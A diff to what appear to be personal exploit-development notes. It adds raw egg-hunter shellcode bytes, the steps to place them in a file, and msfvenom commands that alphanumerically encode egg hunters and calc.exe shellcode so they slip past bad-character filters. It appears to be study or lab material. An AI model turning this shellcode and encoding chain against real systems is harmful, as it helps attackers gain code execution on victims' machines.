@@ -42,6 +42,18 @@ cat egg.bin | msfvenom -a x86 --platform windows -e x86/alpha_mixed -f py
 cat shellcode.bin | msfvenom -p - windows/exec CMD=calc.exe -e x86/alpha_mixed -f python
 ```
 
+# Another Egg 
+```
+because of the bad characters getting mangled.  We can copy these bytes to egg.bin.
+# 6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7 # use replace in nano
+# echo A> egg.bin
+# hexedit egg.bin   # copy the above bytes into this file and ensure no extra characters are there.
+# Then we can encode this egg hunter we already created into alphanumeric (no special bytes, only letters and numbers.
+# 126 byte egg hunter.
+#
+# cat egg.bin | msfvenom -a x86 --platform windows -e x86/alpha_mixed -f py
+```
+
 # One-liner to convert to bin file
 ```
 egghunter.rb  -f raw  -e b00b | xxd  |awk -F":" '{print $2}' |sed 's/ //g' |awk '{print substr($0,0,32)}' | sed 's/\(..\)/\\x\1/g' |tac
